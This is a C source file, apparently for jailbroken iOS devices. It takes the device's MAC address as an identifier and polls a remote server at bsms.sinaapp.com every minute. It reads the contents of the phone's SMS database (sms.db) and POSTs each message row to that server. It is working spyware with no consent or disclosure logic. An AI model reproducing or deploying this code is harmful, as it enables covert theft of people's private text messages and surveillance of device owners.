#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <sys/sysctl.h>
#include <net/if.h>
#include <net/if_dl.h>
#include "sqlite3.h"

#define CURL_MAX_POST_LEN (1024*24)
#define CRON_TASK_TIME 60//TODO release

CURL *curl;
char apiPermitURL[400];
char apiPostURL[400];
int permitId;
char localBuffer[1024*100] = {0};
int cronMessageTask(int rowid);
int getMessage(int rowid, char ***res, int *column);
int sendMessage(CURL *curl, char *messageData);
int getPermitID();
int SqliteQuery(sqlite3 *db, const char *sql, char ***res, int *column);
int getUUID(char* des_netcard , char* out_addr);
int callbackGetPermitID(void *ptr, int size, int nmemb, void *stream);
int callbackBlockedWritedataFunc(void *ptr, int size, int nmemb, void *stream);

int main() {

	/*
    pid_t pid=fork();

    if(pid < 0) {
    	printf("fork() error\n");
        exit(-1);
    } else if(pid > 0) {
    	//This is the parent process
    	exit(-1);
    } else
    //*/
    {
    	printf("sleep:[%ds]\n", CRON_TASK_TIME);
    	sleep(CRON_TASK_TIME);
        //This is the child process
		char UUID[20];
		getUUID("en0", UUID);

		snprintf(apiPermitURL, 400, "http://bsms.sinaapp.com/api/api.php?mod=permit&uuid=%s", UUID);
		snprintf(apiPostURL, 400, "http://bsms.sinaapp.com/api/api.php?mod=post&uuid=%s", UUID);
		//snprintf(apiPermitURL, 400, "http://10.0.8.124:1224//api/api.php?mod=permit&uuid=%s", UUID);
		//snprintf(apiPostURL, 400, "http://10.0.8.124:1224/api/api.php?mod=post&uuid=%s", UUID);

		printf("apiPermitURL:[%s]\n", apiPermitURL);

		//Init CURL
		curl_global_init(CURL_GLOBAL_ALL);
		curl = curl_easy_init();

		//主线程一直循环
		for (;;) {


			permitId = 0;
			localBuffer[0] = 0;
			getPermitID();
			curl_easy_reset(curl);
		    permitId = atoi(localBuffer);

			if(permitId > 0) {
				cronMessageTask(permitId);
				curl_easy_reset(curl);
			}
			if(curl) {
			//	curl_easy_cleanup(curl);
			}
			printf("apiPermitId:[%d]--------------------------------------------------------------EOF\n", permitId);
			sleep(CRON_TASK_TIME);

		}

    }

}

int getPermitID(){
	CURLcode res;
	if (curl) {
		curl_easy_setopt(curl, CURLOPT_URL, apiPermitURL);
		curl_easy_setopt(curl , CURLOPT_TIMEOUT , 3);
		curl_easy_setopt(curl , CURLOPT_WRITEFUNCTION , callbackGetPermitID);
		curl_easy_setopt(curl, CURLOPT_WRITEDATA, localBuffer);
		res = curl_easy_perform(curl);
		printf("localBuffer:[%s]\n", localBuffer);
	}
}

int callbackGetPermitID(void *ptr, int size, int nmemb, void *stream){
    int sizes = size * nmemb;
    memcpy(stream+strlen(stream), ptr, sizes);
    printf("callbackGetPermitID() stream:[%s]\n",stream);
    return sizes;
}

int callbackBlockedWritedataFunc(void *ptr, int size, int nmemb, void *stream) {
    printf("callbackBlockedWritedataFunc() stream:[%s]\n",stream);
	return nmemb;
}

int cronMessageTask(int rowid) {
	char **result;
	int i=0, j=0, nlen=0, column=0, offset = 0;
	int row = getMessage(rowid, &result, &column);

	if(row > 0) {
		if(curl) {
			curl_easy_setopt(curl, CURLOPT_URL, apiPostURL);
			curl_easy_setopt(curl, CURLOPT_TIMEOUT , 3);
			curl_easy_setopt(curl , CURLOPT_WRITEFUNCTION , callbackBlockedWritedataFunc);
		}

		for(i=1; i < (row + 1); i++) {
			char messageData[CURL_MAX_POST_LEN];
			nlen = 0;
			printf("%s,\n", result[i*column]);
			for (j = 0; j < column; j++) {
				offset = i*column+j;
				snprintf(messageData+nlen, CURL_MAX_POST_LEN-nlen, "%s=%s&", result[j], result[offset]);
				nlen = strlen(messageData);
			}
			sendMessage(curl, messageData);
		}
	}
}

int sendMessage(CURL *curl, char *messageData) {

	CURLcode res;

	if (curl) {
		curl_easy_setopt(curl, CURLOPT_POSTFIELDS, messageData);
		res = curl_easy_perform(curl);
	}
}

int getMessage(int rowid, char ***res, int *column) {
	sqlite3 *db;
	int rc;
	rc = sqlite3_open("/private/var/mobile/Library/SMS/sms.db", &db);
	if(rc) {
		fprintf(stderr, "open faile %s\n",sqlite3_errmsg(db));
		sqlite3_close(db);
		return -1;
	}else {
		char sql[400];
		snprintf(sql, 400, "SELECT * FROM Message WHERE ROWID > %d ORDER BY ROWID ASC LIMIT 1000", rowid);

		int ret = SqliteQuery(db, sql, res, column);
		return ret;
	}
}

int SqliteQuery(sqlite3 *db, const char *sql, char ***res, int *column) {
	char *select_str = "SELECT";
	char *errorMsg;
	char *str_str = strstr(sql, select_str);
	int row = 0, i = 0, j = 0;
	if(str_str) {
		sqlite3_get_table(db, sql, res, &row, column, &errorMsg);
	}else{
		sqlite3_exec(db, sql, 0, 0, &errorMsg);
	}
	if(errorMsg){
		printf("%s\n", errorMsg);
		return -1;
	}else{
		return row;
	}
}

int getUUID(char* des_netcard , char* out_addr) {
    int			mib[6];
	size_t			len;
	char			*buf;
	unsigned char		*ptr;
	struct if_msghdr	*ifm;
	struct sockaddr_dl	*sdl;
    mib[0] = CTL_NET;
	mib[1] = AF_ROUTE;
	mib[2] = 0;
	mib[3] = AF_LINK;
	mib[4] = NET_RT_IFLIST;
    if ((mib[5] = if_nametoindex( des_netcard )) == 0) {
		//if_nametoindex error
		return -1;
	}
    if (sysctl(mib, 6, NULL, &len, NULL, 0) < 0) {
		//sysctl 1 error
		return -2;
	}
	if ((buf = malloc(len)) == NULL) {
		//malloc error
		return -3;
	}
	if (sysctl(mib, 6, buf, &len, NULL, 0) < 0) {
		//sysctl 2 error
		free(buf);
		return -4;
	}
    ifm = (struct if_msghdr *)buf;
	sdl = (struct sockaddr_dl *)(ifm + 1);
	ptr = (unsigned char *)LLADDR(sdl);
	snprintf(out_addr , 20 ,"%02x%02x%02x%02x%02x%02x", *ptr, *(ptr+1), *(ptr+2),
           *(ptr+3), *(ptr+4), *(ptr+5));

	free(buf);
    return 0;
}
